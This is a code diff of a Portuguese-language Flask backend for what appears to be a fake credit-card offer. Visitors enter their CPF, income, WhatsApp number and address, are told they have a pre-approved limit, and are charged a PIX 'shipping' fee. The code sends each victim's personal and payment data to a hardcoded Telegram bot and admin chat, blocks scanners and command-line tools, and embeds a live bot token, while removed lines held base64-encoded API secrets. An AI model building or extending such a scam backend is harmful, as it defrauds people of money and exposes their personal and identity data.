@@ -1,7 +1,7 @@
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║  LIVELO CREDIT SYSTEM — v2.0                                                 ║
-║  Simulação de Análise de Crédito + Cobrança de Frete via PIX (C7 API)        ║
+║  Simulação de Análise de Crédito + Cobrança de Frete via PIX (União 7 Pay)   ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 """
 
@@ -27,12 +27,6 @@ try:
 except ImportError:
     _REQUESTS_OK = False
 
-def get_secure_c7_key():
-    return base64.b64decode(b'YzdfbGl2ZV84ODZhMGRkYzYwMDQwZmMzNDAxOTFkYTg3ZDg3NWMwZDczZTJhY2JiYmVhNzlhNTM0YzA3ODJhMjNiMTFiZTBk').decode("utf-8")
-
-def get_secure_c7_secret():
-    return base64.b64decode(b'NmRmMjczNzliZTI2MThiYWU0YzY5YmZmOTM2ZTA2MjQ3MjQ5M2IwZTQ0MjcxOTEyMjlhMWY0NDMyN2MzOTQ5Y2U5NzM4YmMxODI1ZjcyMWZjNDk0NzIyMzFlOWIzOWE4YWI2MmNkZTk1OGExNWEzODcxMDE4NzQyMTg3OTBlYTY=').decode("utf-8")
-
 
 # ── APP SETUP ──────────────────────────────────────────────────────────────────
 app = Flask(__name__, template_folder="templates", static_folder="static")
@@ -49,11 +43,11 @@ def crypt_shield():
     # 2. Blindagem de User-Agent (Bloqueia bots, scrapers, ferramentas de dev e tráfego falso)
     ua = request.headers.get('User-Agent', '').lower()
     bots = ['bot', 'crawler', 'spider', 'headless', 'python', 'curl', 'wget', 'postman', 'insomnia', 'http', 'fetch', 'scan']
-    if any(b in ua for b in bots) and not request.path.startswith('/telegram-webhook'):
+    if any(b in ua for b in bots) and not request.path.startswith('/telegram-webhook') and not request.path.startswith('/api/webhook'):
         return "403 Forbidden - Bot Detected by Active Shield", 403
 
     # Ignora webhooks, arquivos estáticos e a rota pública
-    if request.path.startswith('/telegram-webhook') or request.path.startswith('/static') or request.path.startswith('/api/config'):
+    if request.path.startswith('/telegram-webhook') or request.path.startswith('/api/webhook') or request.path.startswith('/static') or request.path.startswith('/api/config'):
         return
         
     # 3. Camuflagem de portas e rotas da API internas
@@ -116,14 +110,13 @@ except Exception:
 
 ALLOWED_IMG_EXT = {"png", "jpg", "jpeg", "webp", "gif"}
 
-# ── C7 API CONFIG ──────────────────────────────────────────────────────────────
-# Credenciais lidas de variáveis de ambiente — NUNCA hardcoded.
-C7_BASE_URL   = os.environ.get("C7_BASE_URL",   "https://api.carteirado7.com/v2")
-C7_API_KEY    = os.environ.get("C7_API_KEY",    "")
-C7_API_SECRET = os.environ.get("C7_API_SECRET", "")
+# ── UNIÃO 7 PAY API CONFIG ───────────────────────────────────────────────────
+UNIAOPAY_BASE_URL = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay/pix/create")
+UNIAOPAY_API_KEY  = os.environ.get("UNIAOPAY_API_KEY", "")
 
-# Valor do frete do cartão (configurável via env)
-FRETE_VALOR = float(os.environ.get("FRETE_VALOR", "29.90"))
+# Valor padrão do frete do cartão (SEDEX Expresso: 24.90, Entrega Normal: 19.90 visual / 20.00 na API)
+FRETE_VALOR        = float(os.environ.get("FRETE_VALOR", "24.90"))
+FRETE_NORMAL_VALOR = float(os.environ.get("FRETE_NORMAL_VALOR", "19.90"))
 
 # ── RATE LIMIT & BRUTE FORCE ───────────────────────────────────────────────────
 _RATE_DB  : Dict[str, list] = {}
@@ -282,18 +275,19 @@ def init_db():
         );
 
         CREATE TABLE IF NOT EXISTS payments (
-            payment_id   TEXT PRIMARY KEY,
-            c7_id        TEXT,
-            session_id   TEXT,
-            amount       REAL,
-            status       TEXT DEFAULT 'pending',
-            pix_code     TEXT,
-            qr_code_url  TEXT,
-            expires_at   TEXT,
-            payer_name   TEXT,
-            payer_cpf    TEXT,
-            created_at   REAL NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
-            confirmed_at REAL
+            payment_id     TEXT PRIMARY KEY,
+            transaction_id TEXT,
+            c7_id          TEXT,
+            session_id     TEXT,
+            amount         REAL,
+            status         TEXT DEFAULT 'pending',
+            pix_code       TEXT,
+            qr_code_url    TEXT,
+            expires_at     TEXT,
+            payer_name     TEXT,
+            payer_cpf      TEXT,
+            created_at     REAL NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
+            confirmed_at   REAL
         );
 
         CREATE INDEX IF NOT EXISTS idx_leads_session ON leads(session_id);
@@ -303,6 +297,11 @@ def init_db():
         
         try:
             db.execute("ALTER TABLE leads ADD COLUMN location TEXT")
+        except Exception:
+            pass
+            
+        try:
+            db.execute("ALTER TABLE payments ADD COLUMN transaction_id TEXT")
         except Exception:
             pass
             
@@ -419,10 +418,11 @@ def validate_cpf(cpf: str) -> bool:
 
 
 def send_telegram_notify(session_id, event_type="ENTRY"):
-    """Envia notificação Telegram síncrona com estrutura aprimorada."""
+    """Envia notificação Telegram síncrona com estrutura organizada, profissional e sem erros."""
     try:
         import requests as _rq
         import re
+        import datetime
 
         db = get_db()
         cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
@@ -432,22 +432,11 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             cfg.get("telegram_token")
             or os.environ.get("TELEGRAM_BOT_TOKEN")
             or os.environ.get("BOT_TOKEN")
+            or "8390380990:AAGeDvwbsOz7cHXBy22y0vbR4V6DOEFzeA8"
         )
         if not bot_token:
             log.warning("[TG] Sem bot_token — notificação ignorada (event=%s)", event_type)
             return
-
-        if not session_id:
-            return
-
-        lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
-        if not lead:
-            return
-
-        pay = db.execute(
-            "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
-            (session_id,)
-        ).fetchone()
 
         supreme_id = (
             cfg.get("admin_chat_id")
@@ -455,24 +444,49 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             or os.environ.get("SUPREME_ADMIN_ID")
             or os.environ.get("ID_ADMIN_SUPREMO")
             or os.environ.get("ADMIN_CHAT_ID")
+            or "8932547795"
         )
+
+        lead_row = None
+        if session_id:
+            lead_row = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
         
+        lead = dict(lead_row) if lead_row else {}
+
+        pay_row = None
+        if session_id:
+            pay_row = db.execute(
+                "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
+                (session_id,)
+            ).fetchone()
+        pay = dict(pay_row) if pay_row else {}
+
+        # Escolhe canal de logs configurado
         log_channel = None
-        if event_type in ["PIX_PAID", "PIX_GENERATED"]:
+        if event_type in ["PIX_PAID", "PIX_GENERATED", "PIX_PENDING", "PIX_FAILED", "PIX_EXPIRED"]:
             log_channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
         elif event_type == "ENTRY" or str(event_type).startswith("STEP_ACTION"):
             log_channel = cfg.get("tg_log_acessos") or cfg.get("tg_log_channel")
         else:
             log_channel = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
 
-        if not supreme_id and not log_channel:
-            return
-
-        # ── Geolocalização ────────────────────────────────────────────────────
-        geo_link = "N/A"
-        if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost", "::1"]:
+        # ── IP e Geolocalização ────────────────────────────────────────────────
+        client_ip = lead.get("ip")
+        if not client_ip:
             try:
-                ip_data = _rq.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
+                from flask import request as _req_flask
+                client_ip = (
+                    _req_flask.headers.get("CF-Connecting-IP") or
+                    _req_flask.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
+                    _req_flask.remote_addr or "127.0.0.1"
+                )
+            except Exception:
+                client_ip = "127.0.0.1"
+
+        geo_link = "N/A"
+        if client_ip and client_ip not in ["127.0.0.1", "localhost", "::1"]:
+            try:
+                ip_data = _rq.get(f"http://ip-api.com/json/{client_ip}", timeout=2).json()
                 if ip_data.get("status") == "success":
                     lat, lon = ip_data.get("lat"), ip_data.get("lon")
                     city, country = ip_data.get("city"), ip_data.get("country")
@@ -480,205 +494,251 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             except Exception:
                 pass
 
-        import datetime
         agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")
 
-        icons = {"ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", "PIX_PAID": "✅", "INFO_ADDED": "📝"}
-        icon = icons.get(event_type, "ℹ️")
-        if str(event_type).startswith("STEP_ACTION"):
-            icon = "🖱️"
-            if "ABANDONO" in event_type:
-                icon = "🚨"
-
-        titulo = "RASTREAMENTO DE LEAD"
-        if event_type == "ENTRY":           titulo = "🟢 NOVO ACESSO IDENTIFICADO"
-        elif event_type == "CARD_CHOSEN":   titulo = "💳 CARTÃO ESCOLHIDO"
-        elif event_type == "INFO_ADDED":    titulo = "📝 WHATSAPP / DADOS INFORMADOS"
-        elif event_type == "PIX_GENERATED": titulo = "⏳ PIX GERADO"
-        elif event_type == "PIX_PAID":      titulo = "✅ PAGAMENTO CONFIRMADO"
-        elif "ABANDONO" in event_type:      titulo = "🚨 LEAD ABANDONOU O FUNIL"
-        elif str(event_type).startswith("STEP_ACTION"): titulo = f"🔄 ETAPA CONCLUÍDA"
-
-        # Formatação Bem Estruturada para o Admin Supremo
-        texto = f"{icon} <b>{titulo}</b> {icon}\n"
-        texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        texto += f"🕒 <b>Data/Hora:</b> {agora}\n"
-        texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
-        texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
-        if lead.get("whatsapp"):
-            cwa = re.sub(r"\D", "", lead["whatsapp"])
-            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a> ✅ (Validado)\n"
+        nome = lead.get("nome") or "Visitante"
+        cpf = lead.get("cpf") or ""
+        cpf_fmt = f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else (cpf or "Não informado")
         
-        texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        texto += f"🌐 <b>DADOS DE REDE E ACESSO</b>\n"
-        texto += f"💻 <b>Dispositivo:</b> {lead.get('device_brand') or 'Desconhecido'}\n"
-        texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n"
-        if geo_link != "N/A":
-            texto += f"📍 <b>Localização:</b> {geo_link}\n"
-
-        texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        texto += f"📊 <b>STATUS DO FUNIL</b>\n"
-        texto += f"✅ <b>Acesso Inicial:</b> Concluído\n"
-        if lead["cpf"]:           texto += f"✅ <b>CPF:</b> {lead['cpf']}\n"
-        if lead["renda"]:         texto += f"✅ <b>Renda:</b> R$ {lead['renda']}\n"
-        if lead["tipo_renda"]:    texto += f"✅ <b>Ocupação:</b> {lead['tipo_renda']}\n"
-        if lead["motivo_credito"]: texto += f"✅ <b>Motivo:</b> {lead['motivo_credito']}\n"
-        if lead["dia_vencimento"]: texto += f"✅ <b>Vencimento:</b> Dia {lead['dia_vencimento']}\n"
-        if lead["limite_aprovado"]: texto += f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado']}\n"
-        if lead["card_style"]:
-            texto += f"💳 <b>Cartão Escolhido:</b> {lead['card_style']} ({lead['card_color']})\n"
+        wa_raw = lead.get("whatsapp") or ""
+        cwa = re.sub(r"\D", "", str(wa_raw))
+        if cwa and not cwa.startswith("55") and len(cwa) in (10, 11):
+            cwa = "55" + cwa
+        wa_link = f"<a href='https://wa.me/{cwa}'>{wa_raw}</a> ✅ (WhatsApp)" if cwa else "Ainda não informado"
         
-        if str(event_type).startswith("STEP_ACTION"):
-            texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            texto += f"📍 <b>ÚLTIMA AÇÃO:</b>\n{event_type.replace('STEP_ACTION:', '').strip()}\n"
+        dispositivo = lead.get("device_brand") or "Navegador Web / Mobile"
+        limite = lead.get("limite_aprovado") or "Calculando..."
+        renda = lead.get("renda") or "Não informada"
+        tipo_renda = lead.get("tipo_renda") or "Não informada"
+        vencimento = f"Dia {lead['dia_vencimento']}" if lead.get("dia_vencimento") else "Não escolhido"
+        cartao_estilo = lead.get("card_style") or "Black"
+        cartao_cor = lead.get("card_color") or "Padrão"
+        frete_modalidade = lead.get("shipping_method") or "SEDEX - Entrega Expressa"
+        endereco = lead.get("endereco") or "Cadastrado no checkout"
+        cep = lead.get("cep") or "Informado"
 
-        if pay:
-            texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            texto += f"💸 <b>DADOS DE COMPRA / SAÍDA</b>\n"
-            texto += f"💵 <b>Valor:</b> R$ {pay['amount']}\n"
-            st = lead["pix_status"]
-            texto += f"🚦 <b>Status do PIX:</b> {'✅ PAGO!' if st in ['paid','completed'] else '⏳ AGUARDANDO'}\n"
-            texto += f"🆔 <b>ID da Transação:</b> <code>{pay['payment_id']}</code>\n"
-            
+        amount_val = pay.get("amount") or "24.90"
+        tx_id = pay.get("transaction_id") or pay.get("payment_id") or "N/A"
+        pix_code = pay.get("pix_code") or ""
+
+        # Montagem dos layouts organizados por categoria:
+        if event_type in ("PIX_PAID", "APPROVED", "PAGO"):
+            texto = (
+                f"🎉 <b>PAGAMENTO PIX CONFIRMADO — VENDA CONCLUÍDA!</b> 🎉\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💰 <b>VALOR PAGO:</b> R$ {amount_val} ✅\n"
+                f"🕒 <b>Aprovação:</b> {agora}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 <b>DADOS DO CLIENTE</b>\n"
+                f"👤 <b>Nome:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp:</b> {wa_link}\n"
+                f"🎯 <b>Limite Concedido:</b> R$ {limite}\n"
+                f"💳 <b>Cartão Solicitado:</b> {cartao_estilo} ({cartao_cor})\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🚚 <b>LOGÍSTICA & ENVIO</b>\n"
+                f"📦 <b>Modalidade:</b> {frete_modalidade}\n"
+                f"🏠 <b>Endereço:</b> {endereco}\n"
+                f"📮 <b>CEP:</b> <code>{cep}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🛡️ <b>GATEWAY: UNIÃO 7 PAY</b>\n"
+                f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
+                f"🚦 <b>Status:</b> ✅ APROVADO & COMPENSADO IMEDIATAMENTE"
+            )
+
+        elif event_type in ("PIX_GENERATED", "PIX_PENDING"):
+            texto = (
+                f"⏳ <b>COBRANÇA PIX GERADA — AGUARDANDO PAGAMENTO</b> ⏳\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💵 <b>VALOR:</b> R$ {amount_val}\n"
+                f"🕒 <b>Gerado em:</b> {agora}\n"
+                f"⏱️ <b>Validade:</b> 30 minutos\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 <b>DADOS DO CLIENTE</b>\n"
+                f"👤 <b>Nome:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp:</b> {wa_link}\n"
+                f"🎯 <b>Limite Pré-Aprovado:</b> R$ {limite}\n"
+                f"💳 <b>Cartão:</b> {cartao_estilo} ({cartao_cor})\n"
+                f"🚚 <b>Frete Escolhido:</b> {frete_modalidade}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🔑 <b>PIX COPIA E COLA (UNIÃO 7 PAY):</b>\n"
+                f"<code>{pix_code or 'Disponível na tela do lead'}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
+                f"🚦 <b>Status:</b> ⏳ PENDENTE (Aguardando cliente pagar)"
+            )
+
+        elif event_type in ("PIX_FAILED", "PIX_REJECTED", "REJECTED"):
+            texto = (
+                f"❌ <b>PAGAMENTO PIX NÃO CONCLUÍDO / RECUSADO</b> ❌\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💵 <b>Valor da Cobrança:</b> R$ {amount_val}\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"❌ <b>Status:</b> RECUSADO / NÃO AUTORIZADO\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 <b>DADOS DO CLIENTE PARA RECUPERAÇÃO</b>\n"
+                f"👤 <b>Nome:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp de Resgate:</b> {wa_link}\n"
+                f"🎯 <b>Limite Pré-Aprovado:</b> R$ {limite}\n"
+                f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💡 <b>DICA DE RECUPERAÇÃO:</b>\n"
+                f"O cliente não concluiu o pagamento. Clique no WhatsApp acima para reenviar a chave PIX e fechar a solicitação do cartão!"
+            )
+
+        elif event_type in ("PIX_EXPIRED", "EXPIRED"):
+            texto = (
+                f"⏰ <b>PIX EXPIRADO — TEMPO LIMITE ESGOTADO</b> ⏰\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💵 <b>Valor da Cobrança:</b> R$ {amount_val}\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"⏳ <b>Situação:</b> O código PIX expirou sem compensação\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 <b>DADOS DO CLIENTE PARA RE-CONTATO</b>\n"
+                f"👤 <b>Nome:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp de Resgate:</b> {wa_link}\n"
+                f"🎯 <b>Limite:</b> R$ {limite}\n"
+                f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💡 <b>OPORTUNIDADE:</b> Lead quente com interesse no cartão. Entre em contato para gerar nova chave PIX!"
+            )
+
+        elif "ABANDONO" in str(event_type):
+            texto = (
+                f"🚨 <b>LEAD ABANDONOU O FUNIL (SAÍDA DA PÁGINA)</b> 🚨\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"👤 <b>Nome:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp:</b> {wa_link}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💻 <b>Dispositivo:</b> {dispositivo}\n"
+                f"🌍 <b>IP:</b> <code>{client_ip}</code>\n"
+                f"📍 <b>Localização:</b> {geo_link}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🎯 <b>Limite Pré-Aprovado:</b> R$ {limite}\n"
+                f"💳 <b>Cartão:</b> {cartao_estilo} ({cartao_cor})\n"
+                f"💡 <b>AÇÃO RECOMENDADA:</b> Lead qualificado com cartão pendente. Faça o resgate via WhatsApp!"
+            )
+
+        elif event_type == "ENTRY":
+            utm_text = ""
+            if lead.get("utm_source"):
+                utm_text = f"🔗 <b>Origem (UTM):</b> {lead['utm_source']}"
+                if lead.get("utm_campaign"): utm_text += f" / {lead['utm_campaign']}"
+                utm_text += "\n"
+
+            texto = (
+                f"🟢 <b>NOVO VISITANTE IDENTIFICADO NO FUNIL</b> 🟢\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"💻 <b>Dispositivo:</b> {dispositivo}\n"
+                f"🌍 <b>IP:</b> <code>{client_ip}</code>\n"
+                f"📍 <b>Localização:</b> {geo_link}\n"
+                f"{utm_text}"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📊 <b>Status:</b> Entrou na página inicial\n"
+                f"🆔 <b>Sessão:</b> <code>{str(session_id)[:16]}...</code>"
+            )
+
+        elif event_type == "INFO_ADDED":
+            texto = (
+                f"📝 <b>LEAD QUALIFICADO — DADOS COLETADOS</b> 📝\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"👤 <b>Nome:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp:</b> {wa_link}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💼 <b>DADOS FINANCEIROS</b>\n"
+                f"💵 <b>Renda Declarada:</b> R$ {renda}\n"
+                f"🏢 <b>Ocupação:</b> {tipo_renda}\n"
+                f"🎯 <b>Limite Aprovado:</b> R$ {limite}\n"
+                f"📅 <b>Melhor Vencimento:</b> {vencimento}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💻 <b>Dispositivo:</b> {dispositivo} | 🌍 <b>IP:</b> <code>{client_ip}</code>"
+            )
+
+        elif event_type == "CARD_CHOSEN":
+            texto = (
+                f"💳 <b>CARTÃO ESCOLHIDO PELO LEAD</b> 💳\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"👤 <b>Cliente:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp:</b> {wa_link}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💳 <b>Modelo:</b> {cartao_estilo}\n"
+                f"🎨 <b>Cor / Acabamento:</b> {cartao_cor}\n"
+                f"🎯 <b>Limite Liberado:</b> R$ {limite}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💻 <b>Dispositivo:</b> {dispositivo}"
+            )
+
+        elif str(event_type).startswith("STEP_ACTION"):
+            acao = event_type.replace("STEP_ACTION:", "").strip()
+            texto = (
+                f"🔄 <b>MOVIMENTAÇÃO DO LEAD NO FUNIL</b> 🔄\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"👤 <b>Cliente:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp:</b> {wa_link}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📍 <b>Ação Realizada:</b>\n"
+                f"➡️ <b>{acao}</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💻 <b>Dispositivo:</b> {dispositivo} | 🌍 <b>IP:</b> <code>{client_ip}</code>"
+            )
+
+        else:
+            texto = (
+                f"ℹ️ <b>ATUALIZAÇÃO DE LEAD: {event_type}</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🕒 <b>Horário:</b> {agora}\n"
+                f"👤 <b>Cliente:</b> {nome}\n"
+                f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
+                f"📱 <b>WhatsApp:</b> {wa_link}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"💻 <b>Dispositivo:</b> {dispositivo} | 🌍 <b>IP:</b> <code>{client_ip}</code>"
+            )
+
         base_payload = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}
 
-        # ── Envia para canal de log (com edição se for a mesma mensagem) ──────
+        # ── Envia para canal de log (se configurado) ──────
         if log_channel:
             lp = dict(base_payload, chat_id=log_channel)
-            msg_id  = lead.get("tg_message_id")
-            tg_chat = lead.get("tg_chat_id")
-            sent_ok = False
-            if msg_id and str(tg_chat) == str(log_channel):
-                lp["message_id"] = msg_id
-                r = _rq.post(f"https://api.telegram.org/bot{bot_token}/editMessageText", json=lp, timeout=4)
-                if r.json().get("ok"):
-                    sent_ok = True
-                else:
-                    lp.pop("message_id", None)
-            if not sent_ok:
-                r = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=lp, timeout=4)
-                rj = r.json()
-                if rj.get("ok") and "result" in rj:
-                    db.execute("UPDATE leads SET tg_message_id=?, tg_chat_id=? WHERE session_id=?",
-                               (rj["result"]["message_id"], log_channel, session_id))
-                    db.commit()
+            try:
+                _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=lp, timeout=5)
+            except Exception as _ce:
+                log.warning("[TG] Erro envio canal de log: %s", _ce)
 
-        # ── Envia SEMPRE para admin supremo como nova mensagem (Histórico) ────
+        # ── Envia SEMPRE para admin supremo como nova mensagem (Histórico em Tempo Real) ────
         if supreme_id:
             sp = dict(base_payload, chat_id=supreme_id)
-            r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=sp, timeout=4)
-            if not r2.json().get("ok"):
-                log.warning("[TG] Erro supreme_id %s: %s", supreme_id, r2.json().get("description"))
-            else:
-                log.info("[TG] '%s' enviado → supremo", event_type)
+            try:
+                r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=sp, timeout=6)
+                r2_data = r2.json()
+                if not r2_data.get("ok"):
+                    log.warning("[TG] Erro supreme_id %s: %s", supreme_id, r2_data.get("description"))
+                else:
+                    log.info("[TG] '%s' enviado com sucesso → supremo (%s)", event_type, supreme_id)
+            except Exception as _se:
+                log.warning("[TG] Exceção ao enviar para admin supremo: %s", _se)
 
     except Exception as e:
         log.error("[TG] send_telegram_notify ERRO: %s", e, exc_info=True)
 
 
 def send_telegram_report(session_id, is_paid=False):
-    """Relatório de PIX gerado / pago — chamada síncrona dentro do request context."""
+    """Encaminha diretamente para o formato padronizado de notificação."""
     try:
-        _send_telegram_report_inner(session_id, is_paid)
+        send_telegram_notify(session_id, "PIX_PAID" if is_paid else "PIX_GENERATED")
     except Exception as e:
         log.error("[TG] send_telegram_report ERRO: %s", e, exc_info=True)
-
-def _send_telegram_report_inner(session_id, is_paid=False):
-    import requests as _rq
-
-    db = get_db()
-    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
-    cfg = {r["key"]: r["value"] for r in cfg_rows}
-
-    channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
-    supreme_id = (
-        cfg.get("admin_chat_id")
-        or cfg.get("supreme_admin_id")
-        or os.environ.get("SUPREME_ADMIN_ID")
-        or os.environ.get("ID_ADMIN_SUPREMO")
-        or os.environ.get("ADMIN_CHAT_ID")
-    )
-
-    if not channel:
-        channel = supreme_id
-    if not channel and not supreme_id:
-        log.warning("[TG] report: sem destino (session=%s)", session_id)
-        return
-
-    thread_id = cfg.get("tg_log_thread_id")
-    bot_token = (
-        cfg.get("telegram_token")
-        or os.environ.get("TELEGRAM_BOT_TOKEN")
-        or os.environ.get("BOT_TOKEN")
-    )
-    if not bot_token:
-        log.warning("[TG] report: sem bot_token")
-        return
-
-    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
-    if not lead:
-        log.warning("[TG] report: lead nao encontrado (session=%s)", session_id)
-        return
-    pay = db.execute(
-        "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
-        (session_id,)
-    ).fetchone()
-
-    status_icon = "PAGO" if is_paid else "AGUARDANDO PIX"
-    import datetime
-    agora = datetime.datetime.now().strftime("%d/%m/%Y as %H:%M:%S")
-
-    geo_link = "N/A"
-    if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost"]:
-        try:
-            ip_data = _rq.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
-            if ip_data.get("status") == "success":
-                lat, lon = ip_data.get("lat"), ip_data.get("lon")
-                city, country = ip_data.get("city"), ip_data.get("country")
-                geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country}</a>"
-        except Exception:
-            pass
-
-    titulo = "NOVA VENDA CONFIRMADA!" if is_paid else "PIX GERADO COM SUCESSO!"
-    texto = f"<b>{titulo}</b>\n\n"
-    texto += (
-        f"Data/Hora: {agora}\n"
-        f"Nome: {lead['nome'] or '?'}\n"
-        f"CPF: <code>{lead['cpf'] or '?'}</code>\n"
-    )
-    if lead.get("whatsapp"):
-        import re as _re
-        cwa = _re.sub(r"\D", "", lead["whatsapp"])
-        texto += f"WhatsApp: <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a>\n"
-    texto += (
-        f"Renda: R$ {lead['renda'] or 'Nao inf.'}\n"
-        f"Limite: R$ {lead['limite_aprovado'] or 'Nao inf.'}\n"
-        f"Cartao: {lead['card_style'] or '-'} ({lead['card_color'] or '-'})\n"
-        f"Aparelho: {lead.get('device_brand') or 'Desconhecido'}\n"
-        f"IP: <code>{lead['ip'] or '?'}</code> - {geo_link}\n"
-        f"Status PIX: {status_icon}\n"
-    )
-    if pay:
-        texto += f"Valor: R$ {pay['amount']}\n"
-        texto += f"ID Pgto: <code>{pay['payment_id']}</code>\n"
-
-    base = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}
-    if channel:
-        pl = dict(base, chat_id=channel)
-        if thread_id:
-            pl["message_thread_id"] = thread_id
-        r1 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=pl, timeout=5)
-        if r1.json().get("ok"):
-            log.info("[TG] report canal %s OK", channel)
-        else:
-            log.warning("[TG] report canal erro: %s", r1.json().get("description"))
-    if supreme_id and str(supreme_id) != str(channel):
